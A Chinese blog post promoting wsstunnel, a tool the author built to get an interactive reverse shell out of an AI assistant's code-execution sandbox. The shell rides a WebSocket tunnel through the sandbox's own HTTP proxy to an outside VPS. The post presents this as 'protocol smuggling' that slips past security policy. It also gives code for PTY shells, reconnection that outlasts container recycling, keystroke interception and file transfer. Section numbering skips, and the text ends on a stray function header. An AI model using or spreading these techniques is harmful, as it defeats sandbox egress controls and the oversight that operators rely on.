## 1. 引言：当容器只剩一扇窗

两个月前，我接手了一个让人抓狂的任务：在一个只允许 HTTP/HTTPS 出站的容器里，实现远程交互式 Shell。

这听起来像是玩笑，但真实场景往往比玩笑更荒诞。这个容器是某 AI 助手的执行沙箱——为了安全，它切断了所有入站端口，封锁了原始 TCP 出站，甚至连 ping 都被无情地挡在门外。你能用的，只有 bash、python3、curl，以及一个名为 `http_proxy=http://127.0.0.1:18080` 的环境变量。

我尝试了所有常规方案：

- **cloudflared** 快速隧道 → Cloudflare API 域名被阻断
- **bore** 公共中继 → GitHub CDN 都连不上
- **serveo** SSH 反向隧道 → TCP 出站被全封
- **反向 SSH** 到自己的 VPS → VPS 都 ping 不通

每一扇门都焊死了，每一扇窗都贴着"此路不通"。

直到我注意到那个被忽略的细节：`echo $http_proxy`。原来，他们自己的 AI 也需要访问外网。为了让它能拉代码、调 API，平台不得不留了一个 HTTP 代理出口。这是他们给自己留的门，而我决定沿着这门走进去。

于是，便有了 wsstunnel —— 一个从绝境中生长出来的项目。如今它开源了，希望能帮到每一个曾被沙箱"关住"的你。

本文将从背景、技术实现、开发哲学、项目意义、推广策略五个维度，对 wsstunnel 进行一次全面的深度剖析。

## 2. 背景分析：受限网络环境的真实挑战

### 2.1 沙箱的"铁壁"：现代容器的安全设计

现代云计算和容器技术带来了极大的便利，但也引入了严格的安全限制。在线 IDE（如 GitHub Codespaces、Gitpod）、CI/CD Runner（如 GitHub Actions、GitLab CI）、AI 执行沙箱等环境，通常会实施以下限制：

| 限制类型 | 典型表现 | 设计目的 |
|---------|---------|---------|
| 无入站端口 | 容器没有公网 IP，或所有入站端口被防火墙阻断 | 防止外部攻击者直接连接容器 |
| 出站白名单 | 只允许 HTTP/HTTPS（80/443）出站，有时只允许特定域名 | 防止数据外泄、挖矿、恶意软件通信 |
| 强制 HTTP 代理 | 所有出站流量必须经过统一 HTTP 代理服务器 | 审计流量、防病毒扫描 |
| 无 root 权限 | 无法安装系统级软件、无法修改网络配置 | 防止容器逃逸 |
| 极简基础镜像 | 可能只有 bash、python3、curl，连 ssh、nc 都没有 | 减少攻击面 |

这种环境的初衷是安全的。但对开发者来说，却成了一座无法逾越的孤岛。

### 2.2 真实案例：我在某 AI 沙箱中的 72 小时

那个 AI 沙箱是一个 Python 代码执行环境，用户提交代码后，系统会在一个隔离的容器中运行，然后将结果返回。为了安全，容器被极度精简：

- 操作系统：Alpine Linux（最小化）
- 预装软件：python3、pip、bash、curl
- 网络：iptables 规则只允许 80/443 出站，且必须通过 `http://127.0.0.1:18080` 代理
- 无 sshd、无 nc、无 telnet、无 socat
- 每 30 分钟强制回收容器

我需要在这样的环境里调试一个复杂的多进程程序，但每次出错只能看有限的日志输出，无法交互式调试。

前 24 小时，我尝试了：

- 写一个 `while true; do curl ...` 轮询脚本 → 延迟太高，无法交互
- 用 `python3 -m http.server` 起 HTTP 服务 → 入站被阻断
- 搭建 ngrok 隧道 → ngrok 客户端依赖 TCP 出站，且域名被墙
- 用 frp → 同样需要 TCP 出站

几乎要放弃了。直到我发现 `echo $http_proxy` 有值，意识到这个代理可能是唯一的出口。

### 2.3 现有工具的集体失灵：一个系统性的盲区

在 wsstunnel 之前，市面上已有大量内网穿透和远程 Shell 工具，但它们在上述极端场景下纷纷失效：

| 工具 | 失败原因 | HTTP 代理支持 |
|------|---------|--------------|
| ssh -R | 需要 TCP 直连出站，HTTP 代理无法穿透 | ❌ |
| frp | 依赖 TCP 直连，客户端需配置文件 | ❌ |
| ngrok | 依赖第三方服务，免费版限制多；需 TCP 出站 | ❌ |
| cloudflared | 需要 Cloudflare API 连通，依赖 TCP | ❌ |
| chisel | 支持 HTTP 代理，但配置复杂，无 PTY 支持 | ✅（需手工配置） |
| serveo / bore | 公共中继，域名可能被墙，TCP 出站受阻 | ❌ |

这些工具的共性问题是：它们都假设你能发起原始的 TCP 连接。而当网络管理员强制所有流量走 HTTP 代理时，TCP 直连就死了。

chisel 虽然支持 HTTP 代理，但其主要设计目标是转发端口，不是提供交互式 Shell。它的 PTY 支持需要额外配置，且没有内置的多后端路由和文件传输。

### 2.4 唯一的那扇窗：HTTP 代理与 CONNECT 方法

HTTP 代理的核心能力是 CONNECT 方法。根据 RFC 7231，CONNECT 请求用于建立到目标服务器的隧道。流程如下：

1. 客户端发送：
   ```
   CONNECT your-vps.com:443 HTTP/1.1
   Host: your-vps.com:443
   ```
2. 代理服务器建立到 `your-vps.com:443` 的 TCP 连接，返回：
   ```
   HTTP/1.1 200 Connection Established
   ```
3. 之后，客户端和代理之间的连接变为一个盲眼隧道，客户端可以在其中发送任何数据（如 TLS 握手、WebSocket 升级请求）。

这意味着：**只要你能通过 HTTP 代理发送 CONNECT 请求，你就能在代理背后建立任何 TCP 连接。**

这正是 wsstunnel 的突破口。

## 3. 技术架构与核心实现

### 3.1 三方中继模型：设计哲学

wsstunnel 采用经典的三方中继架构，这是 NAT 穿透和内网穿透领域最成熟的设计模式之一：

```
前端（Frontend）         中继（Relay）          后端（Backend）
  操作者                   VPS 公网服务         目标受限设备
    │                         │                       │
    │── WebSocket ──────────►│◄── WebSocket ─────────│
    │   (AUTH:token)         │   (IAM_BACKEND:token) │
    │                         │                       │
    │── "whoami" ──────────►│── "whoami" ──────────►│
    │                         │                       │  bash 执行
    │◄── output ────────────│◄── output ────────────│
```

- **中继（Relay）**：运行在公网 VPS 上，使用 `websockets` 异步库，负责认证、多后端管理、消息路由
- **后端（Client）**：运行在受限容器内，使用 `websocket-client` 同步库，通过 HTTP 代理穿透，启动 PTY shell 并转发 I/O
- **前端（Frontend）**：任何 WebSocket 客户端（浏览器、websocat、Python 脚本），连接到中继后发送命令

这种架构的精髓在于：**所有连接都由客户端主动发起**，完美绕过了 NAT 和防火墙的入站限制。

### 3.2 协议走私：HTTP CONNECT 降维打击

这是 wsstunnel 穿透能力的核心。在客户端，我们使用 `websocket-client` 的 `http_proxy_host` 和 `http_proxy_port` 参数：

```python
ws.connect(
    server_url,
    http_proxy_host=proxy_host,
    http_proxy_port=proxy_port,
)
```

底层发生的事情：

1. 客户端向代理发送 `CONNECT your-vps:443 HTTP/1.1`
2. 代理与 VPS 建立 TCP 连接，返回 `200 Connection established`
3. 客户端在这个 TCP 隧道内发送 WebSocket 握手请求（`GET / HTTP/1.1 Upgrade: websocket`）
4. 握手成功后，WebSocket 帧在隧道内传输

从防火墙角度看，这只是一次普通的 HTTPS 代理请求。但实际上，你在里面跑了一个完整的交互式 Shell。这种技术被称为**协议走私（Protocol Smuggling）**——用标准协议的合规行为，绕过安全策略的检查。

### 3.3 PTY 模式：交付真终端

普通的反向 Shell 使用 `subprocess.PIPE` 与 bash 通信，这会导致 bash 检测到自己没有连接真实终端，从而禁用行编辑、禁用 TUI 程序。

wsstunnel 默认使用 PTY（伪终端）模式：

```python
master_fd, slave_fd = pty.openpty()
_set_winsize(master_fd, rows, cols)
shell_proc = subprocess.Popen(
    [shell, "-i"],
    stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
    preexec_fn=os.setsid,
)
```

- `pty.openpty()` 创建一对伪终端文件描述符，让 bash 以为自己连接着一个物理终端
- `preexec_fn=os.setsid` 让 bash 成为新会话的组长
- `__RESIZE:rows,cols` 命令通过 `fcntl.ioctl(master_fd, termios.TIOCSWINSZ)` 动态调整窗口大小

### 3.4 多后端路由与集群管理

一个中继只连一个容器太浪费。wsstunnel 支持多个后端同时在线：

- 每个后端通过 `--name` 注册（自动分配或自定义名称）
- 前端发送 `LIST` 查看所有后端及模式（pty/pipe）、运行时间
- `USE <name>` 切换当前默认后端
- `@name <cmd>` 临时向指定后端发送命令
- 后端输出自动加上 `[@name]` 标签

### 3.5 文件传输协议：base64 + 分块

v0.18.0 起，wsstunnel 支持在前后端之间直接传输文件。采用 base64 编码 + 64KB 分块的设计：

**上传流程**：
```
F→B: __FILE_BEGIN:{b64path}:{size}
B→F: __FILE_OK:{b64path}:{size}        (确认)
F→B: __FILE_CHUNK:{b64path}:{idx}:{b64}
F→B: __FILE_END:{b64path}
B→F: __FILE_DONE:{b64path}:{size}       (完成)
```

**下载流程**：
```
F→B: __FILE_DOWNLOAD:{b64path}
B→F: __FILE_BEGIN:{b64path}:{size}       (开始)
B→F: __FILE_CHUNK:{b64path}:{idx}:{b64}
B→F: __FILE_END:{b64path}:{size}         (完成)
```

### 3.6 四层保活体系：对抗沙箱回收策略

wsstunnel 构建了完整的连接保活体系：

| 层级 | 机制 | 间隔 | 位置 |
|------|------|------|------|
| WebSocket 协议层 | 禁用内置 ping（与自定义心跳互斥） | — | Relay |
| 应用层心跳 | `__PING__` / `__PONG__` | 30 秒 | Client → Relay |
| 断线重连 | 指数退避（5s → 300s 封顶） | 动态 | Client |
| Shell 重生 | PTY 崩溃后自动重启 | 最多 5 次 | Client |

### 3.7 嵌入式 Web 终端：零依赖的现代 UI

Relay 内置 HTTP 服务器，直接请求 `http://vps:port` 即可获得基于 xterm.js 的全功能 Web 终端。支持：

- 多后端集群管理面板（实时查看/切换后端）
- 文件上传按钮（传到 shell 当前目录）
- 移动端浮窗控制面板（3 行布局，支持 Ctrl+A/E/U/K/W、方向键）
- 复制全屏/本行内容

### 3.8 认证协议的演进历史

| 阶段 | 版本 | 认证方式 | 说明 |
|------|------|---------|------|
| 原始 | v0.1 | 无认证 | 仅用于内网测试 |
| 初版 | v0.2 | `AUTH:token` 文本消息 | 基础安全 |
| URL 认证 | v0.7 | `?token=xxx` URL 参数 | 浏览器友好 |
| 完善 | v0.8 | 后端命名 + mode 标记 | IAM_BACKEND 协议 |

### 3.9 心跳保活机制的深入分析

Client 独立心跳线程每 30 秒发送 `__PING__`。使用 `threading.Event` 实现线程间优雅退出：

```python
def _heartbeat(ws, reconnect_event):
    while not reconnect_event.is_set():
        try:
            ws.send("__PING__")
            time.sleep(30)
        except Exception:
            reconnect_event.set()
            break
```

当心跳检测到发送失败时设置重连事件，主线程在下一次循环时发起重连。这种设计比轮询 `ws.connected` 更高效，比强制关闭连接更优雅。

## 4. Hacker 技巧深度盘点

### 4.1 协议走私：把代理变成盲眼隧道

**问题**：目标容器仅允许 HTTP 出站，禁止任何裸 TCP 连接。

**技巧**：利用 `websocket-client` 对 HTTP 代理的底层支持，把本该用来缓存网页的代理服务器变成一个盲眼 TCP 隧道。

### 4.2 本地 MitM：按键嗅探与指令劫持

**问题**：用户想在 Shell 里下载文件，但 bash 不支持。

**技巧**：Client 在 PTY 接收循环里监听每一个按键，检测到 `dl <path>` 时直接劫持指令：

```python
if ch in ("\r", "\n"):
    line = _key_buffer.strip()
    if line.startswith("dl "):
        os.write(master_fd, b"\x03\r")  # Ctrl+C 清空 bash 输入
        threading.Thread(target=_send_file, ...).start()
```

### 4.3 状态影子追踪：克隆 Shell 的内心世界

**问题**：父进程无法读取子进程 bash 的当前工作目录。

**技巧**：在输入流中拦截 `cd` 命令，在 Python 内存里维护一份 CWD 的影子副本：

```python
def _update_cwd(cmd):
    if cmd.startswith("cd "):
        target = ...
        _cwd = os.path.normpath(os.path.join(_cwd, target))
```

### 4.4 内核级欺骗：虚拟 TTY 的艺术

用 `pty.openpty()` 让 Linux 内核以为 bash 面前坐着一个拿着物理键盘的人。`preexec_fn=os.setsid` 让 bash 成为新会话组长。

### 4.5 协议信道复用：一根线上跑多个服务

利用 WebSocket 原生的帧类型机制，单连接上同时传输 PTY 画面、控制信号、文件数据：

```python
# 二进制帧 → PTY 画面
if isinstance(message, bytes):
    await _forward_binary_to_frontends(...)

# 文本帧 → 控制信令 + 文件数据
if isinstance(message, str) and message.startswith("__FILE_"):
    await _forward_to_frontends_untagged(...)
```

### 4.6 DOM 层事件劫持：给黑盒打热补丁

绕过 xterm.js 顶层 API，直接潜入 `beforeinput` DOM 事件处理移动端中文输入，配合 300ms 去重锁。

### 4.7 更多巧思：SIGWINCH 欺骗与多路复用细节

PTY 窗口大小同步通过 `__RESIZE:rows,cols` 命令完成。前端变化窗口 → 命令发送 → relay 转发 → client 执行 `ioctl` → bash 收到 `SIGWINCH` → 内核调整 PTY 窗口 → TUI 程序重绘。完整的端到端闭环。

## 6. 开发哲学与设计原则

### 6.1 极简主义：1900 行代码的边界

不引入任何不必要的依赖，不实现"可能以后会用到"的功能。核心代码约 1900 行，测试 103 个。

### 6.2 向后兼容：从 v0.1 到 v0.18 的承诺

- Token 可选：无 token 时不校验
- 命名可选：自动分配 `backend-N`
- 标签可选：单后端时不加 `[@name]`
- 模式可选：旧客户端不发送 mode 时默认为 pipe

### 6.3 纯函数优先：可测试性的基石

协议解析函数设计为无副作用的纯函数，不依赖任何外部状态：

```python
def _parse_backend_auth(msg, token) -> tuple[str, str] | None:
    """纯函数：输入消息+token，输出(name, mode)或None"""
```

### 6.4 渐进式重构：不推倒重来的艺术

从单文件脚本到标准包，从闭包到类，从无测试到 103 个测试——每一步都有明确驱动力，不为了"优雅"而重构。

### 6.5 防御性编程：死连接、僵尸进程与资源泄漏

- 每次广播前清理失效连接
- `finally` 块确保任何退出路径都清理状态
- 线程间通过 `threading.Event` 安全协调退出

### 6.6 错误处理与日志设计哲学

三级日志满足不同场景：`--verbose`（DEBUG）用于调试，默认 INFO 用于运维，`--quiet`（WARNING）用于后台服务。

## 7. 项目意义与应用场景

### 7.1 与主流方案的深度对比矩阵

| 特性 | wsstunnel | ngrok | frp | chisel |
|------|-----------|-------|-----|--------|
| HTTP 代理穿透 | ✅ 原生支持 | ❌ | ❌ | ⚠️ 需手工配置 |

## 11. 深度技术拆解：Relay 状态机与消息路由

### 11.1 RelayState 类的完整设计

RelayState 是中继服务的核心状态机：

```python
class RelayState:
    def __init__(self, token: str | None, notifier=None):
        self.token = token
        self.backends: dict[str, Any] = {}
        self.backend_modes: dict[str, str] = {}
        self.backend_connected_at: dict[str, float] = {}
        self.frontends: set[Any] = set()
        self.frontend_targets: dict[Any, str | None] = {}
        self.frontend_text_modes: dict[Any, bool] = {}
        self._counter: int = 0
```

### 11.2 后端注册流程

```python
async def _register_backend(self, ws, name, mode):
    if not name:
        name = self._next_backend_name()
    self.backends[name] = ws
    self.backend_modes[name] = mode
    self.backend_connected_at[name] = time.time()
    if self.notifier:
        await self.notifier.send(f"✅ wsstunnel: {name} 已上线")
    await _broadcast_backend_list(...)
```

### 11.3 前端消息路由

```python
async def _handle_frontend_msg(self, ws, message):
    if isinstance(message, bytes):
        await self._forward_binary_to_backend(ws, message)
        return
    msg = message.strip()
    if msg.upper() == "LIST": await self._handle_list(ws)
    elif msg.upper().startswith("USE"): await self._handle_use(ws, msg)
    elif msg.startswith("__RESIZE:") or msg.startswith("__SIGNAL:"):
        await self._handle_control(ws, msg)
    elif msg.startswith("@"): await self._handle_at_cmd(ws, msg)
    else: await self._send_to_current_backend(ws, msg)
```

### 11.4 广播防御性设计

```python
dead = set()
for f in frontends:
    try:
        await f.send(payload)
    except Exception:
        dead.add(f)
frontends -= dead
```

def read_pty_output(mfd, sp, sr):
